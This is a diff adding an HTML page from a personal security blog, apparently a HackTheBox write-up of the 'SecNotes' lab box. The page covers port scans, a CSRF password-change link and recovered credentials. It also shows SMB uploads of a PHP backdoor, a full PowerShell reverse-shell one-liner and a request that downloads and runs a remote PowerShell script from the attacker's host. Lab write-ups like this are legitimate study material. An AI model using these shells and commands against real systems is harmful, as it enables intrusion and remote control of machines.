@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DocDock Documentation</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-01-19T15:50:30 EST">
+<title>SecNotes :: DocDock Documentation</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/secnotes/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="chickenpwny">ChickenPwny</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/chickenpwny"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock/archive/master.zip"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/chickenpwny2.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home"/></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/github/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item parent active
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/help/" class="dd-item
+        ">
+    <div>
+
+        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/bloodhound/" class="dd-item">
+    <div>
+        <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ftp/" class="dd-item">
+    <div>
+        <a href="/tools/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/github/" >
+   GitHub</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/"  selected>
+  -- 
+   SecNotes</option> 
+  
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+  
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>SecNotes</h1>
+    
+    
+    
+
+
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/secnotes_badge.PNG" alt="secnotes_badge" /></p>
+
+<p>PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods:<br />
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Secure Notes - Login<br />
+|_Requested resource was login.php
+445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
+8808/tcp open  http         Microsoft IIS httpd 10.0
+| htt<img src="https://chickenpwny.github.io/images/secnotes/secnotes_badge.PNG" alt="secnotes_badge" />p-methods:
+|_  Potentially risky methods: TRACE                                                   |_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows<br />
+Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+
+<p>Host script results:
+|_clock-skew: mean: 2h32m44s, deviation: 4h37m10s, median: -7m17s<br />
+| smb-os-discovery:
+|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)<br />
+|   OS CPE: cpe:/o:microsoft:windows<em>10::-<br />
+|   Computer name: SECNOTES
+|   NetBIOS computer name: SECNOTES\x00
+|   Workgroup: HTB\x00
+|</em>  System time: 2019-01-02T17:39:25-08:00<br />
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge<em>response: supported
+|</em>  message<em>signing: disabled (dangerous, but default)<br />
+| smb2-security-mode:
+|   2.02:
+|</em>    Message signing enabled but not required<br />
+| smb2-time:
+|   date: 2019-01-02 20:39:21
+|_  start_date: N/A</p>
+
+<p>create a user contact the admin well uses the change_pass to change tylers password</p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/abuse case study one.PNG" alt="abuse case study one" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/secnotes.PNG" alt="secnotes" /></p>
+
+<p>go to contact then send tyler a request to change his password to whatever</p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/secuteNotes.PNG" alt="secuteNotes" /></p>
+
+<p>CSFA</p>
+
+<p><a href="http://10.10.10.97/change_pass.php?password=chickenpwny&amp;confirm_password=chickenpwny&amp;submit=submit">http://10.10.10.97/change_pass.php?password=chickenpwny&amp;confirm_password=chickenpwny&amp;submit=submit</a></p>
+
+<p>FOUND CREDS</p>
+
+<p>tyler
+92g!mA8BGjOirkL%OG*&amp;</p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/smb-wtf-mate.PNG" alt="smb-wtf-mate" /></p>
+
+<p>smbmap -H 10.10.10.97 -u tyler -p &lsquo;92g!mA8BGjOirkL%OG*&amp;&rsquo;
+[+] Finding open SMB ports&hellip;.
+[+] User SMB session establishd on 10.10.10.97&hellip;
+[+] IP: 10.10.10.97:445 Name: 10.10.10.97<br />
+​        Disk                                                    Permissions</p>
+
+<p>​        ADMIN$                                                  NO ACCESS
+​        C$                                                      NO ACCESS
+​        IPC$                                                    READ ONLY
+​        new-site                                                READ, WRITE</p>
+
+<p>SMBMAP</p>
+
+<pre><code>    -r--r--r--              696 Thu Jun 21 16:15:36 2018    iisstart.htm
+    -r--r--r--            98757 Thu Jun 21 16:15:38 2018    iisstart.png
+</code></pre>
+
+<p>smbmap -H 10.10.10.97 -R new-site -u tyler -p &lsquo;92g!mA8BGjOirkL%OG*&amp;&rsquo; &ndash;upload php-backdoor.php</p>
+
+<p>&ndash;download PATH       Download a file from the remote system,</p>
+
+<p>&ndash;upload SRC DST      Upload a file to the remote system ex.
+​                        &lsquo;/tmp/payload.exe C$\temp\payload.exe&rsquo;<br />
+  &ndash;delete PATH TO FILE<br />
+​                        Delete a remote file, ex. &lsquo;C$\temp\msf.exe&rsquo;</p>
+
+<p>smbclient -U tyler \\10.10.10.97\new-site</p>
+
+<p>sick of smb asking for creds annoying , smbclient has an auth-file switch -A. Next upload the simple-php-backdoor i named mine iisstart.php there are some filters going on if the file isn&rsquo;t named iisstart it will be removed shortly.</p>
+
+<p>smbclient -A smb_key \\\\10.10.10.97\\new-site</p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/smb-wtf-mate-new-site.PNG" alt="smb-wtf-mate-new-site" /></p>
+
+<p>put iisstart.php</p>
+
+<p>now to test if it works with a simple whoami</p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/iistart-cmd-inj-whoami.PNG" alt="iistart-cmd-inj-whoami" /></p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#111">$client</span> <span style="color:#111">=</span> <span style="color:#111">New-Object</span> <span style="color:#111">System</span><span style="color:#111">.</span><span style="color:#111">Net</span><span style="color:#111">.</span><span style="color:#111">Sockets</span><span style="color:#111">.</span><span style="color:#111">TCPClient</span><span style="color:#111">(</span><span style="color:#d88200">&#39;LHOST&#39;</span><span style="color:#111">,</span><span style="color:#111">LPORT</span><span style="color:#111">);</span> <span style="color:#111">$stream</span> <span style="color:#111">=</span> <span style="color:#111">$client</span><span style="color:#111">.</span><span style="color:#111">GetStream</span><span style="color:#111">();</span> <span style="color:#00a8c8">[byte[]]</span><span style="color:#111">$bytes</span> <span style="color:#111">=</span> <span style="color:#111">0</span><span style="color:#111">..</span><span style="color:#111">65535</span><span style="color:#111">|%{</span><span style="color:#111">0</span><span style="color:#111">};</span> <span style="color:#00a8c8">while</span><span style="color:#111">((</span><span style="color:#111">$i</span> <span style="color:#111">=</span> <span style="color:#111">$stream</span><span style="color:#111">.</span><span style="color:#111">Read</span><span style="color:#111">(</span><span style="color:#111">$bytes</span><span style="color:#111">,</span> <span style="color:#111">0</span><span style="color:#111">,</span> <span style="color:#111">$bytes</span><span style="color:#111">.</span><span style="color:#111">Length</span><span style="color:#111">))</span> <span style="color:#f92672">-ne</span> <span style="color:#111">0</span><span style="color:#111">)</span> <span style="color:#111">{;</span> <span style="color:#111">$data</span> <span style="color:#111">=</span> <span style="color:#111">(</span><span style="color:#111">New-Object</span> <span style="color:#111">-TypeName</span> <span style="color:#111">System</span><span style="color:#111">.</span><span style="color:#111">Text</span><span style="color:#111">.</span><span style="color:#111">ASCIIEncoding</span><span style="color:#111">).</span><span style="color:#111">GetString</span><span style="color:#111">(</span><span style="color:#111">$bytes</span><span style="color:#111">,</span><span style="color:#111">0</span><span style="color:#111">,</span> <span style="color:#111">$i</span><span style="color:#111">);</span> <span style="color:#111">$sendback</span> <span style="color:#111">=</span> <span style="color:#111">(</span><span style="color:#111">iex</span> <span style="color:#111">$data</span> <span style="color:#111">2</span><span style="color:#111">&gt;&amp;</span><span style="color:#111">1</span> <span style="color:#111">|</span> <span style="color:#111">Out-String</span> <span style="color:#111">);</span> <span style="color:#111">$sendback2</span> <span style="color:#111">=</span> <span style="color:#111">$sendback</span> <span style="color:#111">+</span> <span style="color:#d88200">&#39;PS &#39;</span> <span style="color:#111">+</span> <span style="color:#111">(</span><span style="color:#111">pwd</span><span style="color:#111">).</span><span style="color:#111">Path</span> <span style="color:#111">+</span> <span style="color:#d88200">&#39;&gt; &#39;</span><span style="color:#111">;</span> <span style="color:#111">$sendbyte</span> <span style="color:#111">=</span> <span style="color:#111">(</span><span style="color:#00a8c8">[text.encoding]</span><span style="color:#111">::</span><span style="color:#111">ASCII</span><span style="color:#111">).</span><span style="color:#111">GetBytes</span><span style="color:#111">(</span><span style="color:#111">$sendback2</span><span style="color:#111">);</span> <span style="color:#111">$stream</span><span style="color:#111">.</span><span style="color:#111">Write</span><span style="color:#111">(</span><span style="color:#111">$sendbyte</span><span style="color:#111">,</span><span style="color:#111">0</span><span style="color:#111">,</span><span style="color:#111">$sendbyte</span><span style="color:#111">.</span><span style="color:#111">Length</span><span style="color:#111">);</span> <span style="color:#111">$stream</span><span style="color:#111">.</span><span style="color:#111">Flush</span><span style="color:#111">()};</span> <span style="color:#111">$client</span><span style="color:#111">.</span><span style="color:#111">Close</span><span style="color:#111">();</span></code></pre></div>
+<p>Nothing quite like when burp hangs.</p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/burphangs.PNG" alt="burphangs" /></p>
+
+<p>GET /iisstart.php?cmd=powershell+IEX(New-Object+Net.WebClient).downloadString(&lsquo;<a href="http://10.10.14.16/Invoke-PowerShellTcp.ps1'">http://10.10.14.16/Invoke-PowerShellTcp.ps1'</a>) HTTP/1.1</p>
+
+<p>Host: 10.10.10.97:8808</p>
+
+<p>try newsstat</p>
+
+<p>netstat -ant</p>
+
+<p>didn&rsquo;t return anything</p>
+
+<p>cmd /r dir /a</p>
+
+<p>cmd ubuntu.exe</p>
+
+<p><a href="https://docs.microsoft.com/en-us/windows/wsl/install-on-server">https://docs.microsoft.com/en-us/windows/wsl/install-on-server</a></p>
+
+<h1 id="windows-subsystem-for-linux">Windows Subsystem for Linux</h1>
+
+<p>07/11/2017  05:10 PM           190,434 AppxBlockMap.xml<br />
+07/11/2017  05:10 PM             2,475 AppxManifest.xml<br />
+06/21/2018  02:07 PM    <DIR>          AppxMetadata<br />
+07/11/2017  05:11 PM            10,554 AppxSignature.p7x<br />
+06/21/2018  02:07 PM    <DIR>          Assets<br />
+06/21/2018  02:07 PM    <DIR>          images<br />
+07/11/2017  05:10 PM       201,254,783 install.tar.gz<br />
+07/11/2017  05:10 PM             4,840 resources.pri<br />
+06/21/2018  04:51 PM    <DIR>          temp<br />
+07/11/2017  05:10 PM           222,208 ubuntu.exe<br />
+07/11/2017  05:10 PM               809 [Content_Types].xml</p>
+
+<p>so using wsl.exe we can use wget the system has cat</p>
+
+<p>in linuc bash files are stored in root or the users home directory.</p>
+
+<p>doskey /History to view command prompt entries</p>
+
+<p>C:\Users\charl\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root</p>
+
+<p>after installing wsl on my computer and doing some test to see how wsl worked. it stores data in appdata</p>
+
+<p>found where wsl stores information used</p>
+
+<p>C:\users\tyler\appdata\Local\packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\localstate\rootfs\root</p>
+
+<p>cmd  /r type .bash_history</p>
+
+<blockquote>
+<pre><code>&gt;  /r type .bash_history
+&gt; cd /mnt/c/
+&gt; ls
+&gt; cd Users/
+&gt; cd /
+&gt; cd ~
+&gt; ls
+&gt; pwd
+&gt; mkdir filesystem
+&gt; mount //127.0.0.1/c$ filesystem/
+&gt; sudo apt install cifs-utils
+&gt; mount //127.0.0.1/c$ filesystem/
+&gt; mount //127.0.0.1/c$ filesystem/ -o user=administrator
+&gt; cat /proc/filesystems
+&gt; sudo modprobe cifs
+&gt; smbclient
+&gt; apt install smbclient
+&gt; smbclient
+&gt; smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+&gt; 
+&gt; &gt; .bash_history 
+&gt; &gt; less .bash_history
+&gt; ```
+&gt;
+&gt;
+
+</code></pre>
+
+<p>cmd /r &ldquo;smbclient -U &lsquo;administrator%u6!4ZwgwOM#^OBf#Nwnh&rsquo; \\127.0.0.1\c$&rdquo;</p>
+</blockquote>
+
+<p>cmd /r &ldquo;type c:\users\administrator\root.txt&rdquo;</p>
+
+<pre><code>
+</code></pre>
+
+<p>smbclient -U &lsquo;administrator%u6!4ZwgwOM#^OBf#Nwnh&rsquo; \\127.0.0.1\c$
+```</p>
+
+<p>Couldn&rsquo;t run the command inside the box but the last entry in bash_history interested me the most. logged out and copy pasted the above string. you can get root.txt</p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/smb-login-administrator.PNG" alt="smb-login-administrator" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/secnotes/smb-login-administrator-2.PNG" alt="smb-login-administrator-2" /></p>
+
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/poison/" title="Poison"> <i class="fa fa-chevron-left"></i><label>Poison</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/valentine/" title="Valentine" style="margin-right: 0px;"><label>Valentine</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/secnotes/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
